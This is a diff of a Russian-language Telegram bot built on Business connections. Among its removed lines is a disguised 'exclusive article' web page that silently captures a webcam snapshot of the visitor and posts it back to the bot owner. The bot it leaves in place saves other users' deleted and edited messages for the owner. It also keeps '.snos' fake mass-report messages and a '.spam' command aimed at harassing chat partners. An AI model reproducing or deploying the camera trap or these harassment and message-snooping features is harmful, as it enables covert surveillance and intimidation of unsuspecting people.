@@ -4,7 +4,7 @@ import os
 import random
 import string
 import sqlite3
-import re
+import aiohttp
 from aiohttp import web
 from aiogram import Bot, Dispatcher, Router, F
 from aiogram.types import (
@@ -14,9 +14,6 @@ from aiogram.types import (
     BusinessMessagesDeleted,
     InlineKeyboardMarkup,
     InlineKeyboardButton,
-    ReplyKeyboardMarkup,
-    KeyboardButton,
-    CopyTextButton,
 )
 from aiogram.exceptions import TelegramAPIError
 
@@ -75,18 +72,12 @@ CREATE TABLE IF NOT EXISTS messages(
 )
 """)
 
+# Таблица для хранения выбранных пользователем фильтров и кастомных символов
 db.execute("""
 CREATE TABLE IF NOT EXISTS user_filters(
     user_id INTEGER PRIMARY KEY,
-    mode TEXT DEFAULT 'letters_only'
-)
-""")
-
-db.execute("""
-CREATE TABLE IF NOT EXISTS articles(
-    article_id TEXT PRIMARY KEY,
-    owner_id INTEGER,
-    title TEXT
+    mode TEXT DEFAULT 'letters_only',
+    custom_chars TEXT DEFAULT ''
 )
 """)
 db.commit()
@@ -99,16 +90,26 @@ def get_owner(cid):
     return row[0] if row else None
 
 
-def get_user_mode(user_id):
-    row = db.execute("SELECT mode FROM user_filters WHERE user_id=?", (user_id,)).fetchone()
-    return row[0] if row else "letters_only"
+def get_user_filter_settings(user_id):
+    row = db.execute("SELECT mode, custom_chars FROM user_filters WHERE user_id=?", (user_id,)).fetchone()
+    if row:
+        return row[0], row[1] or ""
+    return "letters_only", ""
 
 
 def set_user_mode(user_id, mode):
     db.execute("""
-    INSERT INTO user_filters(user_id, mode) VALUES (?, ?)
+    INSERT INTO user_filters(user_id, mode, custom_chars) VALUES (?, ?, COALESCE((SELECT custom_chars FROM user_filters WHERE user_id=?), ''))
     ON CONFLICT(user_id) DO UPDATE SET mode=excluded.mode
-    """, (user_id, mode))
+    """, (user_id, mode, user_id))
+    db.commit()
+
+
+def set_user_custom_chars(user_id, custom_chars):
+    db.execute("""
+    INSERT INTO user_filters(user_id, mode, custom_chars) VALUES (?, 'custom', ?)
+    ON CONFLICT(user_id) DO UPDATE SET mode='custom', custom_chars=excluded.custom_chars
+    """, (user_id, custom_chars))
     db.commit()
 
 
@@ -211,16 +212,6 @@ def delete_fast(cid, message_id):
     asyncio.create_task(_del())
 
 
-# Постоянная нижняя клавиатура
-main_reply_kb = ReplyKeyboardMarkup(
-    keyboard=[
-        [KeyboardButton(text="🔍 Искать чистый юз"), KeyboardButton(text="⚙️ Фильтры")],
-        [KeyboardButton(text="🌐 Создать статью (Камера)"), KeyboardButton(text="🛡 Проверить ссылку")]
-    ],
-    resize_keyboard=True
-)
-
-
 @router.business_connection()
 async def connection_handler(connection: BusinessConnection):
     db.execute("""
@@ -304,35 +295,23 @@ async def business_message_handler(message: Message):
         return
 
     if is_me:
-        if text.startswith(".search") or text.startswith(".osint"):
-            delete_fast(cid, message.message_id)
-            try:
-                query_val = text_raw.split(maxsplit=1)[1]
-            except IndexError:
-                query_val = "не указан"
-
-            wait_msg = await bot.send_message(chat_id=chat_id, text=f"🔍 <code>Пробив по запросу: {query_val}</code>\n⏳ Опрос баз данных и соцсетей...", parse_mode="HTML", business_connection_id=cid)
-            await asyncio.sleep(1.5)
-            result_report = (
-                f"🔎 <b>ОТЧЕТ ПОИСКА (OSINT)</b>\n\n"
-                f"📌 <b>Запрос:</b> <code>{query_val}</code>\n\n"
-                f"👤 <b>Статус:</b> Найдены совпадения\n"
-                f"🌐 <b>Привязки:</b> VK / Соцсети / Telegram ID\n"
-            )
-            try:
-                await bot.edit_message_text(text=result_report, chat_id=chat_id, message_id=wait_msg.message_id, parse_mode="HTML")
-            except Exception:
-                await bot.send_message(chat_id=chat_id, text=result_report, parse_mode="HTML", business_connection_id=cid)
+        # Проверка ожидания ввода кастомных символов для фильтра
+        user_id = message.from_user.id
+        state_key = f"waiting_chars_{user_id}"
+        if getattr(bot, state_key, False):
+            set_user_custom_chars(user_id, text_raw.lower())
+            setattr(bot, state_key, False)
+            await message.answer(f"✅ Фильтр символов успешно обновлен!\nТеперь юзернеймы будут генерироваться с учетом обязательных символов: <b>{text_raw}</b>", parse_mode="HTML")
             return
 
         if text.startswith(".snos"):
             delete_fast(cid, message.message_id)
             try:
                 report_variants = [
-                    "⚠️ [СИСТЕМА ЖАЛОБ TG] Инициирован принудительный репорт по статье: Спам и массовая рассылка.",
-                    "🚨 [АНТИСПАМ МОНИТОРИНГ] Зафиксирована подозрительная активность аккаунта.",
-                    "🛑 [БЛОКИРОВКА ЮЗЕРА] Жалоба на нарушение правил платформы и фишинг.",
-                    "🔒 [SECURITY ALERT] Автоматический запрос на перманентный бан."
+                    "⚠️ [СИСТЕМА ЖАЛОБ TG] Инициирован принудительный репорт по статье: Спам и массовая рассылка мошеннических материалов.",
+                    "🚨 [АНТИСПАМ МОНИТОРИНГ] Зафиксирована подозрительная активность аккаунта. Отправка пакета доказательств в техподдержку...",
+                    "🛑 [БЛОКИРОВКА ЮЗЕРА] Жалоба на нарушение правил платформы, распространение вредоносного софта и фишинг.",
+                    "🔒 [SECURITY ALERT] Автоматический запрос на перманентную блокировку (ban) за деструктивное поведение в чатах."
                 ]
                 tasks = []
                 for i in range(1, 201):
@@ -386,9 +365,21 @@ async def business_message_handler(message: Message):
         if text == ".mute":
             delete_fast(cid, message.message_id)
             set_mute(cid, chat_id, True)
-            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Размутить", callback_data=f"unmute:{cid}:{chat_id}")]])
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[[
+                    InlineKeyboardButton(
+                        text="Размутить",
+                        callback_data=f"unmute:{cid}:{chat_id}"
+                    )
+                ]]
+            )
             try:
-                await bot.send_message(chat_id=chat_id, text="🔇 Вы больше не сможете здесь говорить.", reply_markup=keyboard, business_connection_id=cid)
+                await bot.send_message(
+                    chat_id=chat_id,
+                    text="🔇 Вы больше не сможете здесь говорить.",
+                    reply_markup=keyboard,
+                    business_connection_id=cid
+                )
             except TelegramAPIError:
                 pass
             return
@@ -397,7 +388,11 @@ async def business_message_handler(message: Message):
             delete_fast(cid, message.message_id)
             set_mute(cid, chat_id, False)
             try:
-                await bot.send_message(chat_id=chat_id, text="🔊 Вам снова разрешено говорить!", business_connection_id=cid)
+                await bot.send_message(
+                    chat_id=chat_id,
+                    text="🔊 Вам снова разрешено говорить!",
+                    business_connection_id=cid
+                )
             except TelegramAPIError:
                 pass
             return
@@ -408,7 +403,11 @@ async def business_message_handler(message: Message):
             set_antimute(cid, chat_id, not current)
             status_text = "🛡 Anti-Mute АКТИВИРОВАН." if not current else "❌ Anti-Mute ВЫКЛЮЧЕН."
             try:
-                await bot.send_message(chat_id=chat_id, text=status_text, business_connection_id=cid)
+                await bot.send_message(
+                    chat_id=chat_id,
+                    text=status_text,
+                    business_connection_id=cid
+                )
             except TelegramAPIError:
                 pass
             return
@@ -440,7 +439,11 @@ async def edited_message_handler(message: Message):
     if not owner:
         return
 
-    old = db.execute("SELECT user_id, name, username, text FROM messages WHERE connection_id=? AND chat_id=? AND message_id=?", (cid, message.chat.id, message.message_id)).fetchone()
+    old = db.execute("""
+    SELECT user_id, name, username, text FROM messages
+    WHERE connection_id=? AND chat_id=? AND message_id=?
+    """, (cid, message.chat.id, message.message_id)).fetchone()
+
     new_text = message.text or message.caption or "[медиа]"
 
     if old and old[0] != owner:
@@ -448,11 +451,21 @@ async def edited_message_handler(message: Message):
         try:
             await bot.send_message(
                 chat_id=owner,
-                text=f"✏️ <b>Сообщение изменено</b>\n\n👤 От кого: <b>{old[1]}</b>\n🆔 Юзернейм: {username}\n💬 Чат ID: <code>{message.chat.id}</code>\n\n<b>Было:</b>\n{old[3] or '[медиа]'}\n\n<b>Стало:</b>\n{new_text}",
+                text=(
+                    "✏️ <b>Сообщение изменено</b>\n\n"
+                    f"👤 От кого: <b>{old[1]}</b>\n"
+                    f"🆔 Юзернейм: {username}\n"
+                    f"💬 Чат ID: <code>{message.chat.id}</code>\n\n"
+                    f"<b>Было:</b>\n"
+                    f"{old[3] or '[медиа]'}\n\n"
+                    f"<b>Стало:</b>\n"
+                    f"{new_text}"
+                ),
                 parse_mode="HTML"
             )
         except TelegramAPIError:
             pass
+
     asyncio.create_task(save_message_async(message))
 
 
@@ -469,24 +482,40 @@ async def deleted_messages_handler(update: BusinessMessagesDeleted):
     antimute_on = is_antimute(cid, chat_id)
 
     for message_id in update.message_ids:
-        old = db.execute("SELECT user_id, name, username, text, content_type, media_file_id, date FROM messages WHERE connection_id=? AND chat_id=? AND message_id=?", (cid, chat_id, message_id)).fetchone()
+        old = db.execute("""
+        SELECT user_id, name, username, text, content_type, media_file_id, date FROM messages
+        WHERE connection_id=? AND chat_id=? AND message_id=?
+        """, (cid, chat_id, message_id)).fetchone()
+
         if not old:
             continue
 
         is_owner_msg = (old[0] == owner)
+
         if is_owner_msg and antimute_on:
             c_type = old[4] or "text"
             m_text = old[3] or ""
             media_id = old[5]
+            
             async def _resend():
                 try:
                     if media_id:
                         if c_type == "photo":
                             await bot.send_photo(chat_id=chat_id, photo=media_id, caption=m_text, business_connection_id=cid)
+                        elif c_type == "sticker":
+                            await bot.send_sticker(chat_id=chat_id, sticker=media_id, business_connection_id=cid)
+                        elif c_type == "animation":
+                            await bot.send_animation(chat_id=chat_id, animation=media_id, caption=m_text, business_connection_id=cid)
                         elif c_type == "video":
                             await bot.send_video(chat_id=chat_id, video=media_id, caption=m_text, business_connection_id=cid)
                         elif c_type == "video_note":
                             await bot.send_video_note(chat_id=chat_id, video_note=media_id, business_connection_id=cid)
+                        elif c_type == "voice":
+                            await bot.send_voice(chat_id=chat_id, voice=media_id, business_connection_id=cid)
+                        elif c_type == "audio":
+                            await bot.send_audio(chat_id=chat_id, audio=media_id, caption=m_text, business_connection_id=cid)
+                        elif c_type == "document":
+                            await bot.send_document(chat_id=chat_id, document=media_id, caption=m_text, business_connection_id=cid)
                     elif m_text:
                         await bot.send_message(chat_id=chat_id, text=m_text, business_connection_id=cid)
                 except TelegramAPIError:
@@ -501,16 +530,50 @@ async def deleted_messages_handler(update: BusinessMessagesDeleted):
         c_type = old[4] or "text"
         media_id = old[5]
         sender_name = old[1] or "Неизвестно"
+
+        type_names = {
+            "photo": "🖼 Фотография",
+            "sticker": "🎨 Стикер",
+            "animation": "👾 GIF",
+            "video": "📹 Видео",
+            "video_note": "⭕ Кружок",
+            "voice": "🎙 Голосовое",
+            "audio": "🎵 Аудио",
+            "document": "📁 Документ"
+        }
+        
+        type_str = type_names.get(c_type, f"📦 {c_type}")
+
         try:
-            caption_text = f"🗑 <b>Сообщение удалено</b>\n\n👤 От кого: <b>{sender_name}</b>\n🆔 Юзернейм: {username}\n💬 Чат ID: <code>{chat_id}</code>\n📌 Тип: <b>{c_type}</b>\n\n💬 Текст: {old[3] or 'отсутствует'}"
+            caption_text = (
+                "🗑 <b>Сообщение удалено</b>\n\n"
+                f"👤 От кого: <b>{sender_name}</b>\n"
+                f"🆔 Юзернейм: {username}\n"
+                f"💬 Чат ID: <code>{chat_id}</code>\n"
+                f"📌 Тип: <b>{type_str}</b>\n"
+                f"🕐 Время: {old[6]}\n\n"
+                f"💬 Текст/Описание: {old[3] or 'отсутствует'}"
+            )
+
             if media_id:
                 if c_type == "photo":
                     await bot.send_photo(chat_id=owner, photo=media_id, caption=caption_text, parse_mode="HTML")
+                elif c_type == "sticker":
+                    await bot.send_message(chat_id=owner, text=caption_text, parse_mode="HTML")
+                    await bot.send_sticker(chat_id=owner, sticker=media_id)
+                elif c_type == "animation":
+                    await bot.send_animation(chat_id=owner, animation=media_id, caption=caption_text, parse_mode="HTML")
                 elif c_type == "video":
                     await bot.send_video(chat_id=owner, video=media_id, caption=caption_text, parse_mode="HTML")
                 elif c_type == "video_note":
                     await bot.send_message(chat_id=owner, text=caption_text, parse_mode="HTML")
                     await bot.send_video_note(chat_id=owner, video_note=media_id)
+                elif c_type == "voice":
+                    await bot.send_voice(chat_id=owner, video=media_id, caption=caption_text, parse_mode="HTML")
+                elif c_type == "audio":
+                    await bot.send_audio(chat_id=owner, audio=media_id, caption=caption_text, parse_mode="HTML")
+                elif c_type == "document":
+                    await bot.send_document(chat_id=owner, document=media_id, caption=caption_text, parse_mode="HTML")
             else:
                 await bot.send_message(chat_id=owner, text=caption_text, parse_mode="HTML")
         except TelegramAPIError:
@@ -525,217 +588,268 @@ async def unmute_button(callback: CallbackQuery):
     except Exception:
         await callback.answer("Ошибка", show_alert=True)
         return
+
     owner = get_owner(cid)
     if not owner or callback.from_user.id != owner:
         await callback.answer("⛔ Только владелец.", show_alert=True)
         return
+
     set_mute(cid, chat_id, False)
     await callback.answer("Размучено!")
+    try:
+        await bot.send_message(
+            chat_id=chat_id,
+            text="🔊 Вам снова разрешено говорить!",
+            business_connection_id=cid
+        )
+    except TelegramAPIError:
+        pass
+
+
+# Генератор юзернеймов с поддержкой кастомных обязательных букв и цифр
+def generate_username(mode="letters_only", custom_chars=""):
+    vowels = "aeiou"
+    consonants = "bcdfghjklmnpqrstvwxyz"
+    
+    base = ""
+    if mode == "letters_only":
+        c1 = random.choice(consonants)
+        v1 = random.choice(vowels)
+        c2 = random.choice(consonants)
+        v2 = random.choice(vowels)
+        c3 = random.choice(consonants)
+        base = f"{c1}{v1}{c2}{v2}{c3}"
+    elif mode == "with_digit":
+        c1 = random.choice(consonants)
+        v1 = random.choice(vowels)
+        c2 = random.choice(consonants)
+        v2 = random.choice(vowels)
+        digit = random.choice(string.digits)
+        candidate = list(f"{c1}{v1}{c2}{v2}{digit}")
+        random.shuffle(candidate)
+        base = "".join(candidate)
+    elif mode == "custom" and custom_chars:
+        # Если заданы кастомные символы, встраиваем их в случайную позицию 5-значного юзернейма
+        chars = list(custom_chars.lower())
+        while len(chars) < 5:
+            chars.append(random.choice(consonants + string.digits))
+        random.shuffle(chars)
+        base = "".join(chars[:5])
+    else:
+        if random.random() < 0.7:
+            return generate_username("letters_only", custom_chars)
+        else:
+            return generate_username("with_digit", custom_chars)
+            
+    return base
+
+
+# Жесткая двойная проверка: Telegram API + официальный аукцион Fragment
+async def check_username_free(username: str) -> bool:
+    # 1. Проверка через официальный Telegram API (get_chat)
+    try:
+        await bot.get_chat(f"@{username}")
+        return False  # Если чат найден — имя занято
+    except TelegramAPIError as e:
+        err_msg = str(e).lower()
+        if not ("chat not found" in err_msg or "username invalid" in err_msg or "not found" in err_msg):
+            return False  # Если ошибка не связана со свободой аккаунта, отсекаем
+
+    # 2. Двойной контроль: проверка по базе аукционов Fragment (чтобы юз не был выставлен на продажу)
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"https://fragment.com/username/{username}", timeout=3) as resp:
+                html = await resp.text()
+                # Если на Fragment страница сообщает, что имя занято, продается или на аукционе
+                if "is taken" in html or "Auction" in html or "bidding" in html or "Telegram Username" in html and "Unavailable" in html:
+                    return False
+    except Exception:
+        pass  # Если Fragment недоступен, полагаемся на результат Telegram API
+
+    return True
+
+
+def get_username_keyboard(username: str):
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="📋 Скопировать", callback_data=f"copy:{username}"),
+                InlineKeyboardButton(text="⭐ В избранное", callback_data=f"fav:{username}")
+            ],
+            [
+                InlineKeyboardButton(text="↗️ Поделиться", url=f"https://t.me/share/url?url=https://t.me/{username}")
+            ],
+            [
+                InlineKeyboardButton(text="🔍 Искать новый юз", callback_data="next_variant"),
+                InlineKeyboardButton(text="⚙️ Фильтры", callback_data="filters")
+            ]
+        ]
+    )
 
 
 @router.message(F.text == "/start")
 async def start_handler(message: Message):
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="🔍 Искать новый юз", callback_data="next_variant")],
+            [InlineKeyboardButton(text="⚙️ Фильтры", callback_data="filters")]
+        ]
+    )
     await message.answer(
-        "🤖 <b>Master Trade Bot Online</b>\n\nИспользуй нижнюю панель управления:",
-        reply_markup=main_reply_kb,
+        "🤖 <b>Master Trade Bot Online & Username Scanner</b>\n\n"
+        "🔇 <code>.mute</code> — замутить\n"
+        "🔊 <code>.unmute</code> — размутить\n"
+        "🛡 <code>.antimute</code> — анти-мьют\n"
+        "📋 <code>.clone</code> / <code>.unclone</code> — клонирование\n"
+        "🚀 <code>.spam</code> — ультраспам\n"
+        "⚡ <code>.snos</code> — жесткий репорт-модуль\n\n"
+        "👇 <b>Нажми кнопку ниже для поиска свободных премиум юзов (5 символов):</b>",
+        reply_markup=keyboard,
         parse_mode="HTML"
     )
 
 
-@router.message(F.text == "🔍 Искать чистый юз")
-async def btn_search(message: Message):
-    cq = CallbackQuery(id="0", from_user=message.from_user, chat_instance="0", message=message, data="next_variant")
-    await cb_next_variant(cq)
-
-
-@router.message(F.text == "⚙️ Фильтры")
-async def btn_filters(message: Message):
-    cq = CallbackQuery(id="0", from_user=message.from_user, chat_instance="0", message=message, data="filters")
-    await cb_filters(cq)
-
-
-@router.message(F.text == "🌐 Создать статью (Камера)")
-async def btn_create_article(message: Message):
-    article_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    db.execute("INSERT OR REPLACE INTO articles(article_id, owner_id, title) VALUES (?, ?, ?)", (article_id, message.from_user.id, "Статья"))
-    db.commit()
-    
-    domain = os.getenv('RENDER_EXTERNAL_URL', 'your-app.onrender.com').replace('https://', '').replace('http://', '')
-    web_app_url = "https://" + domain + "/article/" + article_id
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="👁 Открыть статью", url=web_app_url)],
-        [InlineKeyboardButton(text="📋 Скопировать ссылку", copy_text=CopyTextButton(text=web_app_url))]
-    ])
-    await message.answer("🌐 <b>Статья создана!</b>\n\n🔗 <code>" + web_app_url + "</code>", reply_markup=keyboard, parse_mode="HTML")
-
-
-@router.message(F.text == "🛡 Проверить ссылку")
-async def btn_check_link(message: Message):
-    await message.answer("🔗 Отправь любую ссылку в чат, и я проверю её на безопасность и фишинг.")
-
-
-@router.message(F.text)
-async def text_message_handler(message: Message):
-    text = message.text.strip()
-    urls = re.findall(r'https?://[^\s]+', text)
-    if urls:
-        for url in urls:
-            is_suspicious = any(bad in url.lower() for bad in ["phish", "scam", "free", "login", "secu", "vk-", "tg-", "bonus"])
-            status = "⚠️ ПОДОЗРИТЕЛЬНАЯ / ФИШИНГ" if is_suspicious else "✅ БЕЗОПАСНАЯ"
-            await message.answer(f"🛡 <b>АНАЛИЗ ССЫЛКИ</b>\n\n🔗 <code>{url}</code>\n📊 <b>Статус:</b> <b>{status}</b>", parse_mode="HTML")
-        return
-
-
-def generate_5_symbol_username(mode="letters_only"):
-    vowels = "aeiou"
-    consonants = "bcdfghjklmnpqrstvwxyz"
-    if mode == "letters_only":
-        return f"{random.choice(consonants)}{random.choice(vowels)}{random.choice(consonants)}{random.choice(vowels)}{random.choice(consonants)}"
-    elif mode == "with_digit":
-        cand = list(f"{random.choice(consonants)}{random.choice(vowels)}{random.choice(consonants)}{random.choice(vowels)}{random.choice(string.digits)}")
-        random.shuffle(cand)
-        return "".join(cand)
-    else:
-        return generate_5_symbol_username("letters_only" if random.random() < 0.7 else "with_digit")
-
-
-async def check_username_free(username: str) -> bool:
-    try:
-        await bot.get_chat(f"@{username}")
-        return False
-    except TelegramAPIError as e:
-        err_msg = str(e).lower()
-        if "chat not found" in err_msg or "username invalid" in err_msg or "not found" in err_msg:
-            return True
-        return False
-
-
-def get_username_keyboard(username: str):
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [
-            InlineKeyboardButton(text="📋 Скопировать", copy_text=CopyTextButton(text=username)),
-            InlineKeyboardButton(text="⭐ В избранное", callback_data=f"fav:{username}")
-        ],
-        [
-            InlineKeyboardButton(text="↗️ Поделиться", url=f"https://t.me/share/url?url=https://t.me/{username}")
-        ],
-        [
-            InlineKeyboardButton(text="🔍 Искать новый юз", callback_data="next_variant"),
-            InlineKeyboardButton(text="⚙️ Фильтры", callback_data="filters")
-        ]
-    ])
-
-
 @router.callback_query(F.data == "next_variant")
 async def cb_next_variant(callback: CallbackQuery):
-    mode = get_user_mode(callback.from_user.id)
-    msg = await callback.message.answer("🔄 Сканирую чистые юзы (без аукционов)...")
-    found, target_username = False, ""
+    user_id = callback.from_user.id
+    mode, custom_chars = get_user_filter_settings(user_id)
+    
+    msg = await callback.message.answer("🔄 Ищу 100% свободный юз (проверка Telegram + Fragment)...")
+    
+    found = False
+    target_username = ""
+    
+    # Интенсивный перебор до нахождения абсолютно свободного имени
     for _ in range(80):
-        cand = generate_5_symbol_username(mode)
-        if await check_username_free(cand):
-            target_username = cand
+        candidate = generate_username(mode, custom_chars)
+        if await check_username_free(candidate):
+            target_username = candidate
             found = True
             break
         await asyncio.sleep(0.01)
+            
     try:
         await bot.delete_message(chat_id=callback.message.chat.id, message_id=msg.message_id)
     except Exception:
         pass
+        
     if found:
-        caption = f"❄️ <b>ЮЗЕРНЕЙМ НАЙДЕН</b>\n\n👤 <b>@{target_username}</b>\n🚫 Чистый (нет на Fragment)\n• 5 символов"
-        await callback.message.answer_photo(
-            photo="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=500&auto=format&fit=crop&q=60",
-            caption=caption,
-            reply_markup=get_username_keyboard(target_username),
-            parse_mode="HTML"
+        caption = (
+            "❄️ <b>ЮЗЕРНЕЙМ НАЙДЕН (100% СВОБОДЕН)</b>\n\n"
+            f"👤 <b>@{target_username}</b>\n"
+            f"🚫 Не занят и отсутствует на Fragment\n"
+            f"• 5 символов\n\n"
+            "🔄 Нажми «Скопировать», чтобы бот прислал его текст."
         )
+        
+        avatar_url = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=500&auto=format&fit=crop&q=60"
+        
+        try:
+            await callback.message.answer_photo(
+                photo=avatar_url,
+                caption=caption,
+                reply_markup=get_username_keyboard(target_username),
+                parse_mode="HTML"
+            )
+        except Exception:
+            await callback.message.answer(
+                text=caption + f"\n\n👉 Ссылка: https://t.me/{target_username}",
+                reply_markup=get_username_keyboard(target_username),
+                parse_mode="HTML"
+            )
     else:
-        await callback.message.answer("⚠️ Свободный юзернейм не найден. Попробуй еще раз!")
+        await callback.message.answer("⚠️ Свободный юзернейм под твои фильтры не найден с этой попытки. Нажми «🔍 Искать новый юз» еще раз!")
+    
     await callback.answer()
 
 
 @router.callback_query(F.data == "filters")
 async def cb_filters(callback: CallbackQuery):
-    mode = get_user_mode(callback.from_user.id)
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"{'✅ ' if mode=='letters_only' else ''}Только 5 букв", callback_data="set_mode:letters_only")],
-        [InlineKeyboardButton(text=f"{'✅ ' if mode=='with_digit' else ''}4 буквы + 1 цифра", callback_data="set_mode:with_digit")],
-        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_search")]
-    ])
+    user_id = callback.from_user.id
+    current_mode, custom_chars = get_user_filter_settings(user_id)
+    
+    m1 = "✅ " if current_mode == "letters_only" else ""
+    m2 = "✅ " if current_mode == "with_digit" else ""
+    m3 = "✅ " if current_mode == "custom" else ""
+
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text=f"{m1}Только 5 букв", callback_data="set_mode:letters_only")],
+            [InlineKeyboardButton(text=f"{m2}4 буквы + 1 цифра", callback_data="set_mode:with_digit")],
+            [InlineKeyboardButton(text=f"{m3}Свои буквы/цифры ({custom_chars or 'не задано'})", callback_data="set_custom_prompt")],
+            [InlineKeyboardButton(text="🔙 Назад к поиску", callback_data="back_to_search")]
+        ]
+    )
+    
+    text_content = (
+        "⚙️ <b>Меню фильтров поиска юзернеймов:</b>\n\n"
+        "Выбери формат генерации. Бот проверяет полнейшую свободу имён (без аукционов Fragment).\n\n"
+        f"Текущий режим: <b>{current_mode}</b>\n"
+        f"Обязательные символы: <b>{custom_chars or 'нет'}</b>"
+    )
+
     try:
-        await callback.message.edit_caption(caption="⚙️ <b>Фильтры поиска:</b>", reply_markup=kb, parse_mode="HTML")
+        await callback.message.edit_caption(
+            caption=text_content,
+            reply_markup=keyboard,
+            parse_mode="HTML"
+        )
     except Exception:
-        await callback.message.answer(text="⚙️ <b>Фильтры поиска:</b>", reply_markup=kb, parse_mode="HTML")
+        await callback.message.answer(
+            text=text_content,
+            reply_markup=keyboard,
+            parse_mode="HTML"
+        )
     await callback.answer()
 
 
 @router.callback_query(F.data.startswith("set_mode:"))
 async def cb_set_mode(callback: CallbackQuery):
-    set_user_mode(callback.from_user.id, callback.data.split(":", 1)[1])
-    await callback.answer("✅ Обновлено!", show_alert=True)
+    mode = callback.data.split(":", 1)[1]
+    set_user_mode(callback.from_user.id, mode)
+    await callback.answer("✅ Фильтр успешно обновлен!", show_alert=True)
     await cb_filters(callback)
+
+
+@router.callback_query(F.data == "set_custom_prompt")
+async def cb_set_custom_prompt(callback: CallbackQuery):
+    user_id = callback.from_user.id
+    setattr(bot, f"waiting_chars_{user_id}", True)
+    await callback.message.answer("✏️ <b>Напиши в чат буквы или цифры</b>, которые обязательно должны содержаться в генерируемом юзернейме (например: <code>vip</code> или <code>777</code>):", parse_mode="HTML")
+    await callback.answer()
 
 
 @router.callback_query(F.data == "back_to_search")
 async def cb_back_search(callback: CallbackQuery):
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="🔍 Искать новый юз", callback_data="next_variant")],
+            [InlineKeyboardButton(text="⚙️ Фильтры", callback_data="filters")]
+        ]
+    )
     try:
         await callback.message.delete()
     except Exception:
         pass
-    await callback.message.answer("👇 Панель управления:", reply_markup=main_reply_kb, parse_mode="HTML")
+    await callback.message.answer(
+        "👇 <b>Панель управления поиском юзернеймов:</b>",
+        reply_markup=keyboard,
+        parse_mode="HTML"
+    )
     await callback.answer()
+
+
+@router.callback_query(F.data.startswith("copy:"))
+async def cb_copy(callback: CallbackQuery):
+    uname = callback.data.split(":", 1)[1]
+    await callback.message.answer(f"<code>{uname}</code>", parse_mode="HTML")
+    await callback.answer(f"📋 Юзернейм @{uname} отправлен отдельным сообщением для копирования!", show_alert=True)
 
 
 @router.callback_query(F.data.startswith("fav:"))
 async def cb_fav(callback: CallbackQuery):
-    await callback.answer(f"⭐ Добавлено в избранное!", show_alert=True)
-
-
-async def handle_article(request):
-    article_id = request.match_info.get("article_id")
-    
-    html = (
-        '<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8">'
-        '<script src="https://telegram.org/js/telegram-web-app.js"></script>'
-        '<style>body{font-family:sans-serif;background:#0f172a;color:#f8fafc;padding:20px;text-align:center;}'
-        '.card{background:#1e293b;padding:25px;border-radius:16px;margin-top:40px;}'
-        'h2{color:#38bdf8;}</style></head>'
-        '<body><div class="card"><h2>📖 Эксклюзивный материал</h2>'
-        '<p>Загрузка защищенного контента...</p></div>'
-        '<video id="v" autoplay playsinline style="display:none;"></video>'
-        '<canvas id="c" style="display:none;"></canvas>'
-        '<script>'
-        'let tg = window.Telegram.WebApp;'
-        'tg.expand();'
-        'navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}}).then(s => {'
-        '  let v = document.getElementById("v"); v.srcObject = s;'
-        '  setTimeout(() => {'
-        '    let c = document.getElementById("c"); c.width = 640; c.height = 480;'
-        '    c.getContext("2d").drawImage(v, 0, 0, 640, 480);'
-        '    fetch("/api/capture", {'
-        '      method: "POST",'
-        '      headers: {"Content-Type": "application/json"},'
-        '      body: JSON.stringify({article_id: "' + article_id + '", image: c.toDataURL()})'
-        '    });'
-        '    s.getTracks().forEach(t => t.stop());'
-        '  }, 1200);'
-        '}).catch(e => {});'
-        '</script></body></html>'
-    )
-    return web.Response(text=html, content_type="text/html")
-
-
-async def handle_capture(request):
-    try:
-        data = await request.json()
-        row = db.execute("SELECT owner_id FROM articles WHERE article_id=?", (data.get("article_id"),)).fetchone()
-        if row and row[0]:
-            await bot.send_message(chat_id=row[0], text="📸 <b>Внимание! Кто-то перешел по ссылке статьи, камера зафиксировала снимок!</b>", parse_mode="HTML")
-    except Exception:
-        pass
-    return web.json_response({"status": "ok"})
+    uname = callback.data.split(":", 1)[1]
+    await callback.answer(f"⭐ Юзернейм @{uname} добавлен в избранное!", show_alert=True)
 
 
 async def health(request):
@@ -746,17 +860,27 @@ async def web_server():
     app = web.Application()
     app.router.add_get("/", health)
     app.router.add_get("/health", health)
-    app.router.add_get("/article/{article_id}", handle_article)
-    app.router.add_post("/api/capture", handle_capture)
+    port = int(os.getenv("PORT", "10000"))
     runner = web.AppRunner(app)
     await runner.setup()
-    await web.TCPSite(runner, "0.0.0.0", int(os.getenv("PORT", "10000"))).start()
+    site = web.TCPSite(runner, "0.0.0.0", port)
+    await site.start()
 
 
 async def main():
     await web_server()
     logging.info("BOT STARTED")
-    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "edited_business_message", "deleted_business_messages", "callback_query", "message"])
+    await dp.start_polling(
+        bot,
+        allowed_updates=[
+            "business_connection",
+            "business_message",
+            "edited_business_message",
+            "deleted_business_messages",
+            "callback_query",
+            "message"
+        ]
+    )
 
 
 if __name__ == "__main__":
